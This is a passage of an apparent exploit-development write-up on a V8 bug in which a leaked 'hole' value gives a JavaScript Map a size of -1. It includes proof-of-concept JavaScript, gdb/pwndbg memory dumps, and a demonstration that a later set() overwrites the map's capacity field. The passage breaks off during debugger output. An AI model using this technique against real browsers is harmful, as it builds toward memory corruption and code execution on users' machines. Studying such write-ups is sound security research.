</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> map <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Map();
</span></span><span style="display:flex;"><span>map.set(<span style="color:#f60">1</span>, <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>map.set(hole, <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Due to special handling of hole values, this ends up setting the size of the map to -1
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>map.<span style="color:#069;font-weight:bold">delete</span>(hole);
</span></span><span style="display:flex;"><span>map.<span style="color:#069;font-weight:bold">delete</span>(hole);
</span></span><span style="display:flex;"><span>map.<span style="color:#069;font-weight:bold">delete</span>(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Size is now -1
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//print(map.size);
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we know the bug introduced in the patch, we can move to the next step, which is trying to find a way to exploit this bug.</p>
<h2 id="exploitation">Exploitation <a href="#exploitation" class="anchor">#</a></h2>
<p>Now, our first plan would be to recreate the simple POC created in the article locally and try to examine the memory layout after the corruption. But before that, we should gain some knowledge first on how <code>Map</code> is represented.</p>
<h3 id="understanding-how-map-works">Understanding how Map works <a href="#understanding-how-map-works" class="anchor">#</a></h3>
<p>First, let&rsquo;s prepare a js file called <code>poc.js</code>, which contains:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> c <span style="color:#555">=</span> [];
</span></span><span style="display:flex;"><span>m <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Map();
</span></span><span style="display:flex;"><span>m.set(<span style="color:#f60">1</span>, <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>m.set(c.hole(), <span style="color:#f60">1</span>);
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s start the <code>d8</code> via gdb. Don&rsquo;t forget to add <code>--allow-natives-syntax</code> so that we can use commands like <code>%DebugPrint</code> inside the <code>d8</code>, and <code>--shell</code> so that after executing our script, the interpreter will be still running, and we can continue to debug it.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>‚ï∞‚îÄ‚ùØ gdb d8
</span></span><span style="display:flex;"><span>GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
</span></span><span style="display:flex;"><span>Copyright (C) 2022 Free Software Foundation, Inc.
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>pwndbg&gt; run --allow-natives-syntax --shell ./poc.js
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s try to examine the memory layout. First, try to inspect the <code>m</code> object via <code>%DebugPrint</code>:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>V8 version 11.0.0 (candidate)
</span></span><span style="display:flex;"><span>d8&gt; %DebugPrint(m)
</span></span><span style="display:flex;"><span>DebugPrint: 0x3ba20005380d: [JSMap]
</span></span><span style="display:flex;"><span> - map: 0x3ba2001862f1 &lt;Map[16](HOLEY_ELEMENTS)&gt; [FastProperties]
</span></span><span style="display:flex;"><span> - prototype: 0x3ba200186431 &lt;Object map = 0x3ba200186319&gt;
</span></span><span style="display:flex;"><span> - elements: 0x3ba200002259 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
</span></span><span style="display:flex;"><span> - table: 0x3ba20005381d &lt;OrderedHashMap[17]&gt;
</span></span><span style="display:flex;"><span> - properties: 0x3ba200002259 &lt;FixedArray[0]&gt;
</span></span><span style="display:flex;"><span> - All own properties (excluding elements): {}
</span></span><span style="display:flex;"><span> ...
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can shift our focus towards the <code>table</code> properties which is an <code>OrderedHashMap</code> (I recommend you to read this <a href="https://itnext.io/v8-deep-dives-understanding-map-internals-45eb94a183df" target="_blank" rel="noopener">article</a> to gain a better understanding of how the <code>OrderedHashMap</code> works in <code>v8</code>). <code>table</code> is the one that stores the <code>Map</code> elements, current capacity, and buckets.</p>
<p>Let&rsquo;s try to examine the <code>table</code> memory (Remember that we need to subtract the object address returned by the <code>%DebugPrint</code> by 1 in GDB).</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pwndbg&gt; x/30wx 0x3ba20005381d-1
</span></span><span style="display:flex;"><span>0x3ba20005381c:	0x00002c29	0x00000022	0x00000004	0x00000000
</span></span><span style="display:flex;"><span>0x3ba20005382c:	0x00000004	0x00000002	0xfffffffe	0x00000002
</span></span><span style="display:flex;"><span>0x3ba20005383c:	0x00000002	0xfffffffe	0x00002459	0x00000002
</span></span><span style="display:flex;"><span>0x3ba20005384c:	0x00000000	0x000023e1	0x000023e1	0x000023e1
</span></span><span style="display:flex;"><span>0x3ba20005385c:	0x000023e1	0x000023e1	0x000023e1	0x000021b9
</span></span><span style="display:flex;"><span>0x3ba20005386c:	0x00000008	0x00000004	0x00000000	0x00197aa7
</span></span><span style="display:flex;"><span>0x3ba20005387c:	0x000023e1	0x000023e1	0x000021b9	0x00000008
</span></span><span style="display:flex;"><span>0x3ba20005388c:	0x00000008	0x00000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can use the <code>job</code> commands provided by the <code>v8</code> developers so that we can deduce what the raw data represents.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pwndbg&gt; job 0x3ba20005381d
</span></span><span style="display:flex;"><span>0x3ba20005381d: [OrderedHashMap]
</span></span><span style="display:flex;"><span> - FixedArray length: 17
</span></span><span style="display:flex;"><span> - elements: 2
</span></span><span style="display:flex;"><span> - deleted: 0
</span></span><span style="display:flex;"><span> - buckets: 2
</span></span><span style="display:flex;"><span> - capacity: 4
</span></span><span style="display:flex;"><span> - buckets: {
</span></span><span style="display:flex;"><span>              0: 1
</span></span><span style="display:flex;"><span>              1: -1
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> - elements: {
</span></span><span style="display:flex;"><span>              0: 1 -&gt; 1
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span>pwndbg&gt; job 0x3ba200002459
</span></span><span style="display:flex;"><span>0x3ba200002459: [Oddball] in ReadOnlySpace: #hole
</span></span></code></pre></td></tr></table>
</div>
</div><p>So, connecting the dots, the rough layout of some important metadata of the <code>OrderedHashMap</code>:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>table + 0x10 =&gt; Map capacity (0x4)
</span></span><span style="display:flex;"><span>table + 0x14 =&gt; Bucket-0 data
</span></span><span style="display:flex;"><span>table + 0x18 =&gt; Bucket-1 data
</span></span><span style="display:flex;"><span>table + 0x1c =&gt; Entry-0 key (0x00000002)
</span></span><span style="display:flex;"><span>table + 0x20 =&gt; Entry-0 value (0x00000002)
</span></span><span style="display:flex;"><span>table + 0x24 =&gt; Entry-0 next_ptr
</span></span><span style="display:flex;"><span>table + 0x28 =&gt; Entry-1 key (0x00002459)
</span></span><span style="display:flex;"><span>table + 0x2c =&gt; Entry-1 value (0x00000002)
</span></span><span style="display:flex;"><span>table + 0x30 =&gt; Entry-1 next_ptr
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><strong>Notes:</strong> Integer is represented as 31-bit in <code>v8</code>, which is why 0x1 is represented as 0x2. Another example, -1 is represented as 0xfffffffe in the raw memory data.</p>
</blockquote>
<blockquote>
<p><strong>Notes:</strong> <code>v8</code> has pointer compression method (Read this <a href="https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html" target="_blank" rel="noopener">article</a> for a better understanding). tl;dr; <code>v8</code> only store lower 32-bit of a pointer in the memory, and storing the base upper 32-bit in a specific register. And every time <code>v8</code> want to use it, it will do calculation like <code>ptr = base_upper + stored_lower</code>. This is why when we set <code>hole</code> as the key, the stored value is only the lower 32-bit of the <code>hole</code> address, which is 0x2459.</p>
</blockquote>
<blockquote>
<p><strong>Notes:</strong> <code>job</code> is failed to print the map <code>elements</code> properly because of the second element&rsquo;s key is <code>hole</code>. In normal condition, the <code>job</code> command will print all the map <code>elements</code> correctly.</p>
</blockquote>
<p>Reading through the previous article that I recommend you to read about the detailed implementation of <code>OrderedHashMap</code> in JS, some important key information about map:</p>
<ul>
<li>Capacity is required to be a power of 2</li>
<li>Number of buckets = Capacity / 2</li>
</ul>
<h3 id="the-corrupted-maps-impact">The corrupted map&rsquo;s impact <a href="#the-corrupted-maps-impact" class="anchor">#</a></h3>
<p>Now, it&rsquo;s time for us to try to re-create the simple POC that the <code>crbug</code> article gave. I recommend you to read this <a href="https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-rce-183dcb6f3078" target="_blank" rel="noopener">article</a> because it helps me a lot to exploit the corrupted map later. Let&rsquo;s change our <code>poc.js</code> file contents to like below:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> c <span style="color:#555">=</span> [];
</span></span><span style="display:flex;"><span>m <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Map();
</span></span><span style="display:flex;"><span>m.set(<span style="color:#f60">1</span>, <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>m.set(c.hole(), <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(c.hole());
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(c.hole());
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(<span style="color:#f60">1</span>);
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s try to examine this in the <code>gdb</code>.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>d8&gt; m.size
</span></span><span style="display:flex;"><span>-1
</span></span></code></pre></td></tr></table>
</div>
</div><p>The POC is working, now we have a map where its size = <code>-1</code>. What is the impact? Let&rsquo;s just try to check the impact by trying to set a new pair of (key, value) to the corrupted map, hoping that we can somehow trigger Out-of-Bounds write.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>d8&gt; m.set(0x8, -1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>... # Back to gdb and examine the table properties memory.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwndbg&gt; x/40wx 0x2b4f0027fbfd-1
</span></span><span style="display:flex;"><span>0x2b4f0027fbfc:	0x00002c29	0x00000022	0x00000000	0x00000000
</span></span><span style="display:flex;"><span>0x2b4f0027fc0c:	0x00000010	0xfffffffe	0xfffffffe	0x000023e1
</span></span><span style="display:flex;"><span>0x2b4f0027fc1c:	0x000023e1	0x000023e1	0x000023e1	0x000023e1
</span></span><span style="display:flex;"><span>0x2b4f0027fc2c:	0x000023e1	0x000023e1	0x000023e1	0x000023e1
</span></span><span style="display:flex;"><span>0x2b4f0027fc3c:	0x000023e1	0x000023e1	0x000023e1	0x000025d5
</span></span><span style="display:flex;"><span>0x2b4f0027fc4c:	0x928a22d2	0x00000004	0x29386428	0x000025d5
</span></span><span style="display:flex;"><span>0x2b4f0027fc5c:	0x71bade4e	0x00000006	0x69732e6d	0x0027657a
</span></span><span style="display:flex;"><span>0x2b4f0027fc6c:	0x00002231	0x00000004	0xe3e5e7e0	0x0027fc49
</span></span><span style="display:flex;"><span>0x2b4f0027fc7c:	0x00003039	0x00000004	0xb859fc74	0x0019a803
</span></span><span style="display:flex;"><span>0x2b4f0027fc8c:	0x000022c9	0x000006e8	0x0cebf631	0x31d00148
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that <code>table+0x10</code> value, which is the map&rsquo;s capacity got overwritten with our set key (<code>0x10</code> is the <code>0x8</code> integer representation in JS). Let&rsquo;s verify this with the <code>job</code> command.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pwndbg&gt; job 0x2b4f0027fbfd
</span></span><span style="display:flex;"><span>0x2b4f0027fbfd: [OrderedHashMap]
</span></span><span style="display:flex;"><span> - FixedArray length: 17
</span></span><span style="display:flex;"><span> - elements: 0
